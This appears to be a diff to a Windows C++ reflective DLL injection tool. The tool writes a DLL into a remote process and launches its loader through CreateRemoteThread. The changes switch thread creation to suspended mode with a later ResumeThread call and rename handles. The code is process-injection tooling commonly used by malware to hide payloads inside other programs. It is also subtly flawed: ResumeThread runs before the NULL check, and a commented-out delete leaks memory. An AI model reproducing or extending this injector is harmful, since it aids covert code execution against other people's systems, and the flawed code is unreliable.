@@ -82,7 +82,7 @@ static byte_t* inject_dll_to_remote_proc(int pid, size_t dll_size, byte_t* dll_b
 		return NULL;
 	}
 
-	delete tmp_dll_buf;
+	//delete[] tmp_dll_buf;
 
 	return dll_dst;
 }
@@ -160,15 +160,17 @@ int main(int argc, char* argv[]) {
 
 		/* Create local thread to run the function. */
 		DWORD thread_id = 0x0;
-		HANDLE hThread = NULL;
+		HANDLE thread = NULL;
 
-		hThread = CreateThread(
+		thread = CreateThread(
 			NULL, 0,
 			(LPTHREAD_START_ROUTINE)(local_pe_base + (DWORD)reflective_pre_loader_func + DLL_HEADER_SIZE),
-			NULL, 0, &thread_id
+			NULL, CREATE_SUSPENDED, &thread_id
 		);
 
-		if (hThread == NULL) {
+		ResumeThread(thread);
+
+		if (thread == NULL) {
 			std::cout << "[-] Error while running the local thread, exiting ... \n";
 		}
 		else {
@@ -179,7 +181,7 @@ int main(int argc, char* argv[]) {
 		printf("[!] Input char to end the program\n");
 		getchar();
 		//WaitForSingleObject(hThread, INFINITE);
-		CloseHandle(hThread);
+		CloseHandle(thread);
 
 		return 0;
 	}
@@ -246,13 +248,20 @@ int main(int argc, char* argv[]) {
 	dword_t thread_id = 0;
 	HANDLE thread = NULL;
 
-	thread = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)(remote_pe_base + (dword_t)reflective_pre_loader_func + DLL_HEADER_SIZE), NULL, 0, &thread_id);
+	thread = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)(remote_pe_base + (dword_t)reflective_pre_loader_func + DLL_HEADER_SIZE), NULL, CREATE_SUSPENDED, &thread_id);
 	if (thread == NULL) {
 		std::cout << "[-] Error while running the remote thread, exiting ... \n";
 	}
 	else {
 		printf("[+] Successufully ran thread with id: %lu\n", thread_id);
 	}
+
+	ResumeThread(thread);
+
+	WaitForSingleObject(thread, INFINITE);
+
+	// 7. 清理
+	CloseHandle(thread);
 
 	return 0;
 
